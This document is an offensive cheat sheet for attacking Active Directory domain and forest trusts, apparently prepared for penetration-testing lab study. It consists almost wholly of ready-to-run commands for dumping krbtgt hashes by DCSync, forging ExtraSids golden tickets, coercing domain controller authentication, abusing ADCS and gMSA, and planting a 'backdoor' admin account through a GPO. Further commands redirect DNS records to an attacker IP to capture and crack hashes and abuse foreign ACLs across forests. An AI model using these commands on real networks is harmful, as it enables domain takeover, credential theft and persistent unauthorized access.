## Trust Enumeration and Mapping

Map trust relationships before attempting cross-domain or cross-forest attacks.

### Enumerate Trusts (AD Module)

```powershell
Import-Module activedirectory
Get-ADTrust -Filter *
```

### Enumerate Trusts (PowerView)

```powershell
Get-DomainTrust
Get-DomainTrustMapping
```

### Map Trusts with Adalanche

```cmd
.\Adalanche.exe collect activedirectory --domain <domain>
```

In the Adalanche GUI, use this query to view all trust relationships:

```
(objectClass=trustedDomain)
```

---

## Intra-Forest Attacks (Child-to-Parent Escalation)

When you've compromised a child domain, use the ExtraSids attack to escalate to the parent domain.

### Obtain Child Domain KRBTGT Hash

Via Mimikatz DCSync:

```powershell
.\mimikatz.exe "lsadump::dcsync /user:<child-domain>\krbtgt" exit
```

Via secretsdump.py:

```bash
secretsdump.py <child-domain>/Administrator:'<password>'@<child-dc-ip> -just-dc-user <CHILD-DOMAIN>/krbtgt
```

### Get Child Domain SID

```powershell
Get-DomainSID
```

```bash
lookupsid.py <child-domain>/Administrator:'<password>'@<child-dc-ip> | grep "Domain SID"
```

### Get Enterprise Admins Group SID from Parent Domain

```powershell
Get-ADGroup -Identity "Enterprise Admins" -Server "<parent-domain>"
```

```bash
lookupsid.py <child-domain>/Administrator:'<password>'@<parent-dc-ip> | grep -B12 "Enterprise Admins"
```

### Forge Golden Ticket with ExtraSids (Mimikatz)

```powershell
mimikatz # kerberos::golden /user:hacker /domain:<child-domain> /sid:<child-domain-sid> /krbtgt:<krbtgt-hash> /sids:<enterprise-admins-sid> /ptt
```

### Forge Golden Ticket with ExtraSids (Rubeus)

```powershell
.\Rubeus.exe golden /rc4:<krbtgt-hash> /domain:<child-domain> /sid:<child-domain-sid> /sids:<enterprise-admins-sid> /user:hacker /ptt
```

### Forge Golden Ticket with ExtraSids (ticketer.py)

```bash
ticketer.py -nthash <krbtgt-hash> -domain <child-domain> -domain-sid <child-domain-sid> -extra-sid <enterprise-admins-sid> hacker
export KRB5CCNAME=hacker.ccache
psexec.py <child-domain>/hacker@<parent-dc-hostname>.<parent-domain> -k -no-pass -target-ip <parent-dc-ip>
```

### Automated Child-to-Parent Escalation (raiseChild.py)

```bash
raiseChild.py -target-exec <parent-dc-ip> <child-domain>/htb-student_adm
```

### Access Parent DC After Forging Ticket

```powershell
ls \\<parent-dc-hostname>.<parent-domain>\c$
mimikatz # lsadump::dcsync /user:<DOMAIN>\lab_adm
```

---

## Printer Bug / Unconstrained Delegation Coercion

Force a DC to authenticate to a host you control that has unconstrained delegation enabled, capturing its TGT.

### Monitor for TGTs with Rubeus

```powershell
.\Rubeus.exe monitor /interval:5 /nowrap
```

### Trigger Printer Bug (SpoolSample)

```powershell
.\SpoolSample.exe <target-dc-hostname>.<domain> <unconstrained-host>.<domain>
```

### Renew Captured TGT

```powershell
.\Rubeus.exe renew /ticket:<base64-ticket> /ptt
```

---

## ACL Abuse on Configuration Naming Context

If you have write rights over the Configuration NC, you can escalate forest-wide.

```powershell
$dn = "CN=Configuration,DC=<DOMAIN>,DC=AD"
$acl = Get-Acl -Path "AD:\$dn"
$acl.Access | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|Write"}
```

---

## Certificate-Based Privilege Escalation (ADCS)

### Request Certificate with Alternate UPN

```powershell
.\Certify.exe request /ca:<domain>\<CA-name> /domain:<domain> /template:"Copy of User" /altname:<DOMAIN>\Administrator
.\Rubeus.exe asktgt /domain:<domain> /user:Administrator /certificate:cert.pfx /ptt
```

---

## GPO Abuse from Child Domain

### Create and Link GPO as SYSTEM

```powershell
$gpo = "Backdoor"
New-GPO $gpo
New-GPOImmediateTask -Verbose -Force -TaskName 'Backdoor' -GPODisplayName "Backdoor" -Command C:\Windows\System32\cmd.exe -CommandArguments "/c net user backdoor B@ckdoor123 /add"
Get-ADDomainController -Server <parent-domain> | Select ServerObjectDN
$sitePath = "CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=<DOMAIN>,DC=AD"
New-GPLink -Name "Backdoor" -Target $sitePath -Server <child-domain>
```

---

## gMSA Attacks

Group Managed Service Account password recovery from the parent domain.

### Enumerate gMSA Accounts

```powershell
.\GoldenGMSA.exe gmsainfo --domain <domain>
```

### Retrieve msds-ManagedPasswordID

```powershell
.\GoldenGMSA.exe gmsainfo --domain <domain>
```

### Retrieve KDS Root Key Info

```powershell
.\GoldenGMSA.exe kdsinfo --forest <child-domain>
```

### Compute gMSA Password

```powershell
.\GoldenGMSA.exe compute --sid "<account-sid>" --forest <child-domain> --domain <domain>
.\GoldenGMSA.exe compute --sid "<account-sid>" --kdskey AQAAAAwsk<...>
```

### Convert Password to NT Hash (Python)

```python
import base64
import hashlib
base64_input = "<base64-managed-password>"
print(hashlib.new("md4", base64.b64decode(base64_input)).hexdigest())
```

---

## DNS Abuse for Intra-Forest Lateral Movement

### Add Wildcard DNS Record (Powermad)

Forces all DNS lookups for non-existent hosts in the zone to resolve to your IP for hash capture.

```powershell
Import-Module Powermad.ps1
New-ADIDNSNode -Node * -domainController <dc-hostname>.<domain> -Domain <domain> -Zone <domain> -Tombstone -Verbose
```

### Enumerate DNS Records

```powershell
Get-DnsServerResourceRecord -ComputerName <dc-hostname>.<domain> -ZoneName <domain> -Name "@"
Resolve-DnsName -Name <dev-server>.<domain> -Server <dc-hostname>.<DOMAIN>
```

### Modify a DNS Record (Redirect Traffic)

```powershell
$Old = Get-DnsServerResourceRecord -ComputerName <dc-hostname>.<DOMAIN> -ZoneName <domain> -Name <dev-server>
$New = $Old.Clone()
$TTL = [System.TimeSpan]::FromSeconds(1)
$New.TimeToLive = $TTL
$New.RecordData.IPv4Address = [System.Net.IPAddress]::parse('<attacker-ip>')
Set-DnsServerResourceRecord -NewInputObject $New -OldInputObject $Old -ComputerName <dc-hostname>.<DOMAIN> -ZoneName <domain>
```

### Start Inveigh for Hash Capture

```powershell
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y -SMB Y
hashcat -m 5600 <hash-file> /usr/share/wordlists/rockyou.txt
```

---

## Cross-Forest Foreign User and ACL Enumeration

### Enumerate Foreign Users

```powershell
Get-DomainForeignUser
Get-DomainGroup -Identity '<group>' -domain <parent-domain>
```

### Create Sacrificial Logon Session

```powershell
./Rubeus createnetonly /program:powershell.exe /show
```

### Create New User in Parent Domain

```powershell
Import-Module .\PowerView.ps1
$SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force
New-DomainUser -Domain <parent-domain> -SamAccountName <newuser> -AccountPassword $SecPassword
Add-ADGroupMember -identity "DNSAdmins" -Members <newuser> -Server <parent-domain>
```

### Enumerate Foreign ACLs

```powershell
$sid = Convert-NameToSid <username>
Get-DomainObjectAcl -ResolveGUIDs -Identity * -domain <parent-domain> | ? {$_.SecurityIdentifier -eq $sid}
```

### Add Foreign User to Group in Parent Domain

```powershell
Add-DomainGroupMember -identity 'Infrastructure' -Members '<child-domain>\<username>' -Domain <parent-domain> -Verbose
Get-DomainGroupMember -Identity 'Infrastructure' -Domain <parent-domain> -Verbose
```

### Enumerate All Foreign ACLs

```powershell
$Domain = "<parent-domain>"
$DomainSid = Get-DomainSid $Domain
Get-DomainObjectAcl -Domain $Domain -ResolveGUIDs -Identity * | ? {
    ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner') -and
    ($_.AceType -match 'AccessAllowed') -and
    ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and
    ($_.SecurityIdentifier -notmatch $DomainSid)
}
ConvertFrom-SID S-1-5-21-...
```

---

## Cross-Forest Attacks

### Kerberoast Across Forest Trust

```powershell
.\Rubeus.exe kerberoast /domain:<external-domain>
```

```bash
GetUserSPNs.py -request -target-domain <external-domain> <DOMAIN>/<username>
```

### Enumerate Users with SIDHistory

```powershell
Get-ADUser -Filter "SIDHistory -Like '*'" -Properties SIDHistory
```

### Get Trust Attributes

```powershell
Get-DomainTrust -domain <external-domain> | Where-Object {$_.TargetName -eq "<domain>"} | Select TrustAttributes
```

### Retrieve Inter-Realm Tickets (Mimikatz)

```powershell
Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' | select name,objectguid
.\mimikatz.exe "lsadump::dcsync /guid:{<trust-object-guid>}" "exit"
```

### Parse msDS-TrustForestTrustInfo

```bash
python3 ftinfo.py
```

### Enumerate Foreign Security Principals

```powershell
Get-DomainObject -LDAPFilter '(objectclass=ForeignSecurityPrincipal)' -Domain <external-domain>
```

### Enumerate Foreign ACL Principals

```powershell
Get-DomainObjectAcl -ResolveGUIDs -Identity * -domain <external-domain> | ? {$_.SecurityIdentifier -eq $sid}
```

### Abuse Foreign ACL - Password Reset

```powershell
Set-DomainUserPassword -identity <target-user> -AccountPassword $pass -domain <external-domain> -verbose
```

### Shadow Principal in Bastion Forest

```powershell
Set-ADObject -Identity "CN=<name>,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=<domain>,DC=corp" -Add @{'member'="CN=Administrator,CN=Users,DC=<domain>,DC=corp"} -Verbose
Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,'msDS-ShadowPrincipalSid' | fl
```

---

## Shadow Credentials / Whisker on Intra-Forest Targets

### Add Credential to DC Machine Account

```powershell
.\Whisker.exe add /target:<dc-hostname>$ /domain:<domain>
.\Rubeus.exe s4u /dc:<dc-hostname>.<domain> /ticket:<base64-ticket> /impersonateuser:administrator@<domain> /ptt /self /service:host/<dc-hostname>.<domain> /altservice:cifs/<dc-hostname>.<domain>
```

### DCSync After Compromise

```powershell
.\mimikatz.exe "lsadump::dcsync /user:<child-domain>\krbtgt" exit
```

---

## SQL Server Cross-Domain Pivoting

### Enumerate SQL Server Links

```powershell
Get-SQLServerLink
Get-SQLQuery -Query "EXEC sp_helplinkedsrvlogin"
```

### Connect to Cross-Forest SQL Server

```bash
mssqlclient.py <username>@<sql-server-ip> -windows-auth
```

### Get LocalSid for SQL Server

```bash
proxychains python getlocalsid.py <domain>/Administrator@<sql-server>.<external-domain> <sql-server>
```
